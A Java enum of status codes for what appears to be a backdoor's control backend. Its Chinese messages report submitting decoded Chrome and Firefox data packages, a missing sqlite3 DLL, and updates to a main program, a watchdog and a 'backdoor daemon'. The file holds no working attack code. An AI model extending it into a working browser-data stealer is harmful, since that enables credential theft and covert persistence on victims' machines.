package com.jimmy.infaction.enumn;

/**
 * @author jimmy on 2019/9/30 7:45
 */
public  enum GeneralStatus {
	FAILD(-100,"提交包失败"),
	FIREFAILD(97,"打包firefox包失败"),
	FIRESUCCESS(98,"提交firefox包成功"),
	DW_CHROME(99,"解码chrome失败"),
	SUCCESS(100,"提交chrome包成功"),
	NOT_FIND(101,"找不到chrome"),
	UPDATE_DOG_SUCCESS(102,"更新狗成功"),
	FAV_BRO_SUCCESS(103,"tasklist解码成功"),
	FAV_BRO_FAILD(104,"tasklist解码失败"),
	NOT_SQLITE(200,"找不到sqlite3dll"),
	NOT_MAIN_UPDATE(300,"更新主程序失败"),
	NOT_DOG_UPDATE(301,"更新狗失败"),
	NOT_MAIN_DAEMON_UPDATE(302,"更新主程序守护程序失败"),
	NOT_DOG_DAEMON_UPDATE(303,"更新后门守护程序失败"),
	MAIN_PROCESS(0,"主程序"),
	DOG_PROCESS(1,"看门狗"),
	MAIN_DAEMON(2,"主守护"),
	DOG_DAEMON(3,"狗守护");

	private  int code;
	private String message;

	public int getCode() {
		return code;
	}

	public void setCode(int code) {
		this.code = code;
	}

	public String getMessage() {
		return message;
	}

	public void setMessage(String message) {
		this.message = message;
	}

	@Override
	public String toString() {
		return this.name() + "(" + this.code + "," + this.message + ")";
	}
	/**
	 * 根据code获取message
	 * @param code
	 * @return
	 */
	public static String getMessage(int code){
		//通过enum.values()获取所有的枚举值
		for(GeneralStatus codeAndMessage : GeneralStatus.values()){
			//通过enum.get获取字段值
			if(codeAndMessage.getCode() == code){
				return codeAndMessage.message;
			}
		}
		return null;
	}
	/**
	 * 根据code获取CodeAndMessage
	 * @param code
	 * @return
	 */
	public static GeneralStatus getCodeAndMessage(int code){
		for(GeneralStatus codeAndMessage : GeneralStatus.values()){
			if(codeAndMessage.getCode() == code){
				return codeAndMessage;
			}
		}
		return null;
	}
	private GeneralStatus(int code, String message) {
		this.code = code;
		this.message = message;
	}

}

